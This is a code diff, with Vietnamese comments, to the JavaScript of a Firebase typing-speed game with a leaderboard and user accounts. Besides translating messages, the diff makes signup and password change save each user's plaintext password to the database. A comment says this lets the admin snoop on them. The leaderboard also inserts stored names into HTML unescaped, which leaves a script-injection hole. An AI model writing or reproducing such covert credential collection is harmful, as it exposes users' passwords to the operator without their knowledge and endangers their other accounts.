@@ -1,4 +1,3 @@
-// Cấu hình Firebase - Thay bằng config của ông nếu cần
 const firebaseConfig = { 
   apiKey: "AIzaSyCrgepkYAgTAniQBrDRRqis470Aea6Stk4", 
   authDomain: "speedtype-pro-f0b75.firebaseapp.com", 
@@ -65,10 +64,11 @@ function startTimer() {
 function finish() {
     const wpm = Math.round(cWords);
     if(auth.currentUser) saveBestScore(wpm);
-    else alert("Result: " + wpm + " WPM. Login to save!");
+    else alert("Kết quả: " + wpm + " WPM. Đăng nhập để lưu top nhé!");
     init();
 }
 
+// CẬP NHẬT TOP VỚI USERNAME XỊN
 async function saveBestScore(wpm) {
     const u = auth.currentUser;
     const userDoc = await db.collection("users").doc(u.uid).get();
@@ -86,22 +86,25 @@ async function saveBestScore(wpm) {
     loadBoard();
 }
 
+// ĐĂNG KÝ CÓ LƯU MẬT KHẨU CHO ADMIN SOI
 async function handleAuth(type) {
     if (type === 'signup') {
         const username = document.getElementById('r-user').value;
         const email = document.getElementById('r-email').value;
         const pass = document.getElementById('r-pass').value;
-        if(!username) return alert("Enter Username!");
+        if(!username || !email || !pass) return alert("Điền đủ info ông ơi!");
         try {
             const res = await auth.createUserWithEmailAndPassword(email, pass);
-            await db.collection("users").doc(res.user.uid).set({ username, email, createdAt: Date.now() });
+            await db.collection("users").doc(res.user.uid).set({ 
+                username, email, password: pass, createdAt: Date.now() 
+            });
             location.reload();
         } catch (err) { alert(err.message); }
     } else {
         const email = document.getElementById('l-email').value;
         const pass = document.getElementById('l-pass').value;
         try { await auth.signInWithEmailAndPassword(email, pass); location.reload(); } 
-        catch (err) { alert(err.message); }
+        catch (err) { alert("Sai Gmail hoặc Mật khẩu!"); }
     }
 }
 
@@ -109,7 +112,7 @@ auth.onAuthStateChanged(async (u) => {
     if (u) {
         const userDoc = await db.collection("users").doc(u.uid).get();
         const userData = userDoc.exists ? userDoc.data() : { username: "User" };
-        document.getElementById('auth-status').innerHTML = `<span style="color:#48bb78">● ${userData.username}</span>`;
+        document.getElementById('auth-status').innerHTML = `<span style="color:#48bb78">● Online: ${userData.username}</span>`;
         document.getElementById('auth-forms').style.display = 'none';
         document.getElementById('profile-section').style.display = 'block';
         document.getElementById('p-username').innerText = userData.username;
@@ -124,7 +127,7 @@ async function loadBoard() {
     snap.forEach(doc => {
         const d = doc.data();
         h += `<tr><td>${r++}</td><td>${d.name}</td><td style="color:#5cb85c; font-weight:bold">${d.wpm}</td>
-        <td><img src="https://flagcdn.com/16x12/${d.code}.png"></td><td>${d.lang}</td><td>Online</td></tr>`;
+        <td><img src="https://flagcdn.com/20x15/${d.code}.png"></td><td>${d.lang || "Vietnamese"}</td><td>Vừa xong</td></tr>`;
     });
     document.getElementById('leaderboard-data').innerHTML = h;
 }
@@ -144,8 +147,10 @@ async function changePassword() {
     try {
         await user.reauthenticateWithCredential(cred);
         await user.updatePassword(newP);
-        alert("Password updated!");
-    } catch (e) { alert("Error: Check old password!"); }
+        // Cập nhật lại mật khẩu trong Firestore để admin soi tiếp
+        await db.collection("users").doc(user.uid).update({ password: newP });
+        alert("Đổi mật khẩu thành công!");
+    } catch (e) { alert("Mật khẩu cũ không đúng!"); }
 }
 
 function changeLang(l) { currentLang = l; init(); }
